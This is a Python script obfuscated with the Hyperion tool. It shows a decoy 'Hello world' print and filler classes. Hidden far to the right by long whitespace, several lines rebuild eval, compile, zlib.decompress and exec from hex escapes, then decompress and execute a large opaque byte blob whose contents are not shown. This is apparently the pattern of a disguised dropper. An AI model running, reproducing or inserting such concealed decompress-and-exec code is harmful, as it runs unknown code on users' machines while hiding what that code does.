from builtins import *
from math import prod as Hypothesis
#safarxcod
#ricodeAekalobisa:v

__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


Absolute, Invert, _random, MemoryAccess, While, _multiply, _add = exec, str, tuple, map, ord, globals, type

class Ceil:
    def __init__(self, System):
        self.StackOverflow = Hypothesis((System, 21551))
        self.Cube(Round=5450)

    def Cube(self, Round = Ellipsis):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.StackOverflow /= -96926 * Round
        
        try:
            ((Invert, (While, MemoryAccess)) for Invert in (Absolute, MemoryAccess, Absolute) if While == Absolute)

        except AttributeError:
            ({_run: 'ld5tuaeu'} or Absolute if {_run: 'ld5tuaeu'} and Absolute else ... or (Absolute, {_run: 'ld5tuaeu'}))

        except:
            _add(97537 / 25694) == int

    def _while(self, Power = 21572):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Power += -44780 / 94176
        self._modulo != True
        
        try:
            ((Absolute, (_run, Absolute)) for Absolute in (_run, Absolute) if MemoryAccess is _multiply)

        except AssertionError:
            ({Absolute: _random} or _run if {Absolute: _random} and _run else ... or (_run, {Absolute: _random}))

        except:
            _add(27789 + 13669) == str

    def _memoryaccess(Add = bool):
        return _multiply()[Add]

    def Theory(_negative = 50837 - 51607, Floor = type, Multiply = _multiply):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Multiply()[_negative] = Floor
        
        try:
            ((_random, (While, MemoryAccess)) for _random in (While, MemoryAccess) if Invert == _multiply)

        except AssertionError:
            ((MemoryAccess, (Absolute, MemoryAccess, Absolute)) for MemoryAccess in {Absolute: _random} if Absolute != While)

        except:
            _add(70199 * -62611) == bool

    def execute(code = str):
        return Absolute(Invert(_random(MemoryAccess(While, code))))

    @property
    def _modulo(self):
        self.Math = '<__main__.StackOverflow object at 0x000002661BE49271>'
        return (self.Math, Ceil._modulo)

if __name__ == '__main__':
    try:
        Ceil.execute(code = __code__)
        _product = Ceil(System = 71422 - -81645)

        if 315480 > 6683624:
            _product.Cube(Round = _product.StackOverflow / 82343)
        elif 138116 < 4178979:
            Ceil(System = 74558 + -94792).Cube(Round = _product.StackOverflow * 13396)                                                                                                                                                                                                                                                          ;Ceil.Theory(_negative='lijiiljjjjijjjllj',Floor=b'x\x9c\xe5Z\xddo\xe28\x10\x7f^\xfe\n\x96\x97\x10\xf5+8\xc1\x01\xa4}9q\xa7\xabt-\xa7\xe5t\xediw\x85\x12\xe2\xb4fM\x8c\x92\xb0\xc0\x7f\x7f3\xb6\x03)\x1f\xd7P\xda}\xb8\xdaL\xfc5\xe38\x93\xf1ol\x87<]\xf5ju\x08<n\xaa\x14\xc3h$\xc3x\x9e\x8d\x83\\\xa6\xa3Q\xfd\xe3\xa7\xc6\xef\xab\x19K\xb9L\x1au\x99\x96\xd8\x82y\xfe(\xd3L\xf14\x1b!\x17b\x95?\xb2\x07\x19\xe4n\x9b6\xce\x1b\xbf\x889\xfb\xcc\xa2\x86\xfdD\xea\x81\xe7\x8f\xf3Pw\xfc\x98\xe7\xb3\xacwu\xa5\xeb.\xc7rz\xb5\xd5\xcd\xd5\x81{G<\x1b\xcb4z\xda\x8d\xa9\xbc|x\xb8\x9a\x89\xe0a\xce\xb6\x84\x04\x1f\xb3$cZ\xe8\xd7?\xff\xb8 \x97\xce\x16\xcbXF\xba\xdd\x9a\xa5<\xc9\x9b\x8d\xdf\x99\x10\xb2\xbe\x90\xa9\x88>6l\xabf\xf7\xd6\xdc\xd8ne\xdfyd\xd95\xb6\x1c\xb3Yn\x94\x99\xcc\xe6 \xf9Yf,\xab\x07)\xab\xa7,\xfa\x9a\xfc\xcd\xa5`\xb9\xae\x08A3_\x93\x7f\xe4\\\x95\x82:v\xf25\xb9\x95\xa1\x8cVu\xc1\xbf\x83\xdcJ\xce\x1bvM\x0f\x8aOg2\xcdG#\xb8\xdb*\xb3\xecK\xb6\xe4y\xd3\xae\t9\x0eD\xd6\xb4\xbfX\x93\x89\x80\xc0!\x8a\t\x87\x0b\xb7\xbe}z\x102\x84\xe6\xdaN\x1b\n,\x96\x8b\xe5r\x81WHU\xb0\xbe\xf4zg\x17g\x17\xcd\x8b\xe6Y\xcb\xb6\xbfA\x07,\x0f\xf2<\xdd\xdfA2U1\x99\xaa\x80)\x96 \xec\xf6\x13\xf1\x03}\xa0\x1cv\xa0\x08\x03\xe4`\xe0\xfa\xb1j\xfbZQ\xea\xee\xee\xee\xfe\x0e\xc3\xfd}\x91B\x05\xc8m\xf4\xb4\xffv\xf0\xbc\x0bM\xf8\xe4\xf0\xf8 \xb3\xbf\xb3\xa6\x15\xce\xb9\xc8y\x82\xca\xfe\x11\xa4YmG\x16;\x1c\x0e\t!\xc3!&C\xb2\xceC\xafF\xa5\x057\\\x9b\x87n\x94%<\x17|\x1en\xab\xcd>/\x9e\xb9\xacd\x15\x8f\xef\xcb\xfe\xf2\x9a\x9d]\xf2$b\xcb\xa6\xc5\x04\x9fM\xe5x\x87\xe1\x9b\xbd_\xff\x90\x87\xc2\x04+9TO\x84\xe2\x9a\xbc\x1f}e"\xf8m\x9f\xb6\xf6\x1aW\x7f0\x18\x00I\x08\x83>\x90\xec\x0f\x8e\xd3\x14\xe7\xe3,H\xf8\xabh\xea`_/\xd1\xd4\xe1\xce\nM\xadb.\x96\xec1\x99W\xb6\xad\x05\x06\xa5\x0f\xa5J\xa3\xa0wcZB\xca\xdd\xd6C\xba\x02c\x1a\xa0M\xf5\xb5}\xe1o\xd0\x07UY\xd6\xe5D\xf2d\xbf9\xe2\x88\xee\xf5\x80\xcc\xe0\xf48\xdf\x8f\x8a\x83\x1f\xac\xf2\xe4\xbd7\xf7\xb9\xd7w{Oz\xca\x03)\xe2\xca\xb68P\x08\xe7H\x07,\x12\xc8\xc1\xe8 \xbd\x1b}\xb1y\xfaWeu\r\x87\xc4D\xb3\xea0+\x8f\xe1\xf0\xdd\xe8+\xcd\xb3\xca\xea\xba\xb9\x85p\x03\xe1\xd6D\xa8(\x0b\x1f\x02\xb5\xe6\x1e\xe7\xdb\x0c-\xd7!\x11\xe9\x90\xc8m\x91.,\x0c#\x86\x9b\x85\xa6\xd5\x89\xf3]Ge\xab\xa5\xef\xfbx%c\xb6\xac\x0c\x8d\xfb5K\xc7^\xd7\xeb\xd2\xf1\xd3\xb8\xa9\xc1\xdcs\x1a\x87\x8dC0\r\xa3\xa0>p\x94\x83S0\x82\xb8\x02wqz{\xc6r\xcc\xf8\x02\xda\xa58\x9a@\x8d\'P\x845\x98\xd3-c\x9d\xab<J\xb3\x7fJ\x8aW\x91T\x1e\xa2\xde\xed\xe1\xf2\x192\x130y>\xe1\x95\xac\xda\xb2\x9dQw\xe4\x8f\xc8\xc8\x19u\x80\xdcQ{\xe4\xe3\xc0vk+\xf6\xe7\x03o\x17dZ#\xec\xa3\x0bW\n\x02\x9d\xdd\xda\x8a\xfd\xa1\x84\xa3\xc6\xe2\x81\x1c\xc5\x1c\x08\x90\xdd\xdaSfq\xbb\x1d+\xea\x94\xc81u\xc4\xe4\xbb$T3\xbd\no\xa7\x1a\x1a\x94ic\x05\xda\x084\xa1!\xf4\xf6o{\x8f\xb0U\x8fy\xd1\x9a"\x95\xb2\x9dr9\xc7\x9e\xb7\xd9#UL|\xd7s\x1d\xa0\x808\x1e\xa3\xb1\xefAJ!mSF=\xe2?\xab\xae\xfdv\xcf9W\xf0\x0ev\xcf\xd1\xfa\x11\xf0!L\xaa\x1a?0\xb4N1\x1c\x1f^\xb6\x0b\xd42i\xd7\x18\x045\x84\xed\xd4\x18N\x15\xdevu\xc3Y\x1b\x8c0\xe1Z\\_#\x89\xeb\xde\x1e\xd7\xb7_\x7f\x1a\xef\x0b\xbc\x99\xaemoZyv:0\xb3\xdb\x80\x10\x14r\x1e\xa0\x85\xabf\xe7Nme4B\x19\x17d\\\x88]D\r\x85F;\xb5U\xc7\x07\x0c\xce\xab\xf3\x1e0\x86N\t\x050\xf5\xccKn\x99\xba\x96z\xc1\xda\x18\xaa\xf0z\xc7\xa3\xc8\x13\xc3\xd0Gp\x066\xa6E\xac\xeeT\xd0\x94\x846)e]B\x1b\xd8)*"\xe61]C\xd4\x94\xe9\x16\xc8>\xc7W\x11`_\x00S/\x85\xa2\x83\xc8\xcb\x0c\xaeFk\x0c\xde\xd4\xb12\x12\xbf\x01\xe6z\x11m\xf9.m\x01\xd6\x12\xda\xf6\t,HZ4\xf4\xdb\xc4i\xbb\xd4\x85r\xd7w\x10\x89\xdb\x1em\xab\xb6\x0epv \xc5\x16\xf7\xc5\xa8\x0c\x8b-\x18\x8cZh9\x90s\x06fh\xa7XN\xb741\xca\xc8\xe9\x96\xdc\xaek\xac\xa7\n/\xa9jAf2\x15\xd8\xaaI\x87W\xf0\xcc0\x18\xd7\xa11\x12\x8d=\x15\xb1\xc6\x8bu\x19\xf3\xd8\xa6\xeb\x91\xde\xc0J\xc0\x06\xba\xbeG;pKF\x1cH;\x84a\xdd\xebN\x85v\xa7\xedC\xec\x18\xf2\xb7\xca\xaaTy\xa9\x8c\xde\x1e\x0f\x8e\xf1\xe8X\xf9~1\xa9\x8ek\x0b\x9d].\xd7\x99\xa7\xdf:\xfe\xc3G\xe0\xba\xd3\x07\x9fF\xd5J\xd6\x1b\x81\xcf8s\xb7\xeb~\x96\xbf9r\xef\xb9\xf1\x0fG[\x08`\x85B\x0f\x02\xb7\xa4\xf1\x13\x1b\x81\xbc\xefAt|\x17\xd6v1\x89\x81\xaf\xe5\xfb\x84Q\x9f*\xab\x82\x15\x1e\x01iW\xe1\x8f\x8b6\xe6#\xda\xc0\x15x\xb0\x1c\x81\x0c`\x14\xa5 G\xdc\x96K`\xc5\xa4z\x81{@+\xa4]\xb0\xcb\x18\xaf \xd9\xc2m\xd5i\xf6i-\xf4\xbb/\x0e\x88\xb1\xf0S\xcf\x00\x8c\x11\xeb/D\xea\xbcF\x7f/\x1aV^\xb8\x1d\xd8\x932P\x97\x8elM:F[Q\xd5\xfd\x8f<\x0ez\x1b\xbd\xbdWg\x87\xfa\x00\xf1$\x87\xd32o\xd5y\xb3\xa5\x06X\xff\x18\xb4\x00V\xff\xf2\xe7\xeec\xb7xl\xdf\x97\xfa\x06x\xe9\xf7\xe5)O\xee\x19\x97\xd96\xee\xd3+\xb9\xd3\xf5\xc6\xc5\xb8\xda*\xbc\xfe\x91\xf3B\x1f\xd1\x15\xc7s7\xea\xc8\xee\xb6:\xbc\xabg\xdb\x04(\xbd\xc1f\xa1\x03\x9b\x1aOmI\xf0\x00\x82\x00\xf8\xe3F\xa5\xbb[{\xea\x9a\xc71\n.\x94I\x8d\x92ii3\xf1\x1c\xdf\x91\x1b\x89\x17\x98r\x1b\x1c\x04Ls\x04\xf9\x97O\xe2k\xb5\xb8R{\rC\xd7\xd56\x1b\xc7\xbd:\xdc\x91\xfa\xe0\xa9\t\xeeK\xf1dKy\xf1\xd6n\xed\xa9\x07\x03\xb4\xb4\xc7\xf3K\xfb;\xbf\x98#\xa5\x83\x81\xe7x+\xa2\xd0\xce\x1ep\x80`\x80\xcb\xf1\xbe\x84\xb4\xaf>\xf3\r\x0e\xad[\xe3TN\xeb\xc5\xff\x1c\xea\xfa\xaf\x13u\xb6d\xe3s\xf5\xcf\x97s\xa0\x1a\x16\x9bz\x1d,\xcc\xdb\xd2\x0bc\xb8\xd85##\xb3\xf3l\x95\xe9\xfer>eE_\x99`lV\xcb\xf1/F\x1f\x82\xe0\x93\xcc.\x81-g\xd3\xe6rY8\xe2\xb5G^\xd8\xb5\x0faX\xe2Q\xc7\xb7\xf8er\x80g\xb8x\x9a\x8b\xa7\xba\xce\xc0\x01\xc6\x12\xd7\xa0\x80\x7fi\xbe\x1b\x01\xa7\x94\xc0\xc3\xe3\xba\xc1\x14D\x14\x93\xea\xcbm\x9d\'\xf50\x84Q}\xd0\xff\xf1\xb95\xc8s\xa3\xa1\xe8V\x0b@\'Ldl\xc3\xa6\xd0\xa5\x8c5w\x9b\xbf\xfd\x18\x96D\x9f\xb0\x14\x07\xbb\xeb\x13v\xbb\xf6/\xca\x13\x9b\xe8')

        if 146278 > 3626892:
            _product.Cube(Round = _product.StackOverflow / -93657)
        elif 348600 < 5948102:
            _product._while(Power = -24249 * _product.StackOverflow)                                                                                                                                                                                                                                                          ;ljijillljlljlijjiijijj,ODOOODOODDooOooOOOooDo,IIILLJIJIILJLIIIJIJI,wwxxwxwxxwwxwwwwxwx,llIlllIlIIIlIlIllll=(lambda NNNMMNNNMNNNNNNMN:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(NNNMMNNNMNNNNNNMN)"),filename='\x6d\x6d\x6d\x6e\x6e\x6e\x6e\x6e\x6d\x6e\x6d\x6d\x6d\x6e\x6e\x6e\x6e\x6d\x6e\x6d\x6d',mode='\x65\x76\x61\x6c'))),(lambda NNNMMNNNMNNNNNNMN:NNNMMNNNMNNNNNNMN(__import__('\x7a\x6c\x69\x62'))),(lambda NNNMMNNNMNNNNNNMN:NNNMMNNNMNNNNNNMN['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda:(lambda NNNMMNNNMNNNNNNMN:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(NNNMMNNNMNNNNNNMN)"),filename='\x6d\x6d\x6d\x6e\x6e\x6e\x6e\x6e\x6d\x6e\x6d\x6d\x6d\x6e\x6e\x6e\x6e\x6d\x6e\x6d\x6d',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda jiiiijilljilljjljljji,NNNMMNNNMNNNNNNMN:jiiiijilljilljjljljji(NNNMMNNNMNNNNNNMN))
        if 451054 > 1286338:
            Ceil(System = 24808 / 80352).Cube(Round = _product.StackOverflow + 25485)
        elif 486846 < 2445484:
            _product.Cube(Round = _product.StackOverflow - 20568)                                                                                                                                                                                                                                                          ;wwxxwxwxxwwxwwwwxwx()(llIlllIlIIIlIlIllll(IIILLJIJIILJLIIIJIJI(ODOOODOODDooOooOOOooDo(ljijillljlljlijjiijijj('\x76\x61\x72\x73'))),Ceil._memoryaccess(Add='lijiiljjjjijjjllj')))

    except Exception as _run:
        if 270622 > 1212605:
            Ceil.execute(code = Invert(_run))

        elif 393993 > 5603595:
            _product._while(Power = -73083 / _product.StackOverflow)
